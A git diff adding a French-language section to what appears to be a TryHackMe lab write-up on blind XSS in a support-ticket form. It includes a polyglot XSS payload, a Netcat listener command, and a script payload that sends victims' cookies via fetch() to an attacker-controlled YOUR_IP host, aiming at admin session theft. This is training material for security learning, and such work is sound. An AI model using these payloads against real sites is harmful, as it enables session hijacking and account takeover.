@@ -116,3 +116,45 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stY
 
 ---
 
+## 🔍 Bonus – Blind XSS & Cookie Stealing
+
+Dans cette dernière tâche, on exploite une **faille de type Blind XSS** dans le système de création de ticket support.
+
+### 🔧 Étapes pratiques :
+
+1. Accède au site cible :  
+   `https://10-10-186-81.p.thmlabs.com`
+
+2. Crée un compte via **Customers > Signup**.
+
+3. Va sur **Support Tickets**, clique sur **Create Ticket**, et entre :
+   - Subject : `test`
+   - Content : `</textarea><script>alert('THM');</script>`
+
+4. Le `alert('THM')` prouve la faille XSS sur un champ censé être sécurisé.
+
+---
+
+### 🎯 Exploitation : Cookie Stealing via Blind XSS
+
+1. Prépare un listener avec Netcat sur l’AttackBox :
+```bash
+nc -nlvp 9001
+````
+
+2. Payload XSS à injecter dans un ticket :
+
+```html
+</textarea><script>fetch('http://YOUR_IP:9001?cookie=' + btoa(document.cookie));</script>
+```
+
+🔸 Remplace `YOUR_IP` par l’IP de l’AttackBox (ou catcher).
+🔸 Tu recevras une requête contenant les cookies en base64.
+
+3. Décode sur :
+   [https://www.base64decode.org/](https://www.base64decode.org/)
+
+---
+
+### ✅ But : Obtenir les cookies d’un **admin/staff** consultant le ticket → escalade de privilèges possible.
+
